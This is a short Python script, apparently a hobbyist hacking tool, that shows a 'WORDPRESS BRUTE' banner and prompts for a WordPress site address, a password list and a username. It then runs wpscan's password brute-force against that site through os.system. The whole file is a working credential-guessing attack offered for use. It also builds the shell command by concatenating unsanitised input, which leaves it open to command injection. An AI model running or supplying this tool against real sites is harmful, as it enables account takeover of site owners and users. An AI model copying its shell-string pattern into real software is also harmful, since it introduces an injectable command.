import colorama
import time
import os
import platform as pf
import pyfiglet


sysclear = pf.uname()[0]

if sysclear == 'Linux':
    os.system('clear')

banner = pyfiglet.figlet_format('WORDPRESS BRUTE')

print(banner)
print('')
dominname = input(colorama.Fore.LIGHTYELLOW_EX+'\n Enter Domin Name  Login page Wordpress : '+colorama.Fore.GREEN).casefold()
print('')
passlist = input(colorama.Fore.LIGHTYELLOW_EX+'\n Enter Password List : '+colorama.Fore.GREEN).casefold()
print('')
userdomin = input(colorama.Fore.LIGHTYELLOW_EX+'\n Enter Username Site : '+colorama.Fore.GREEN).casefold()


os.system('wpscan --url '+dominname+' --passwords '+passlist+' --username '+userdomin)

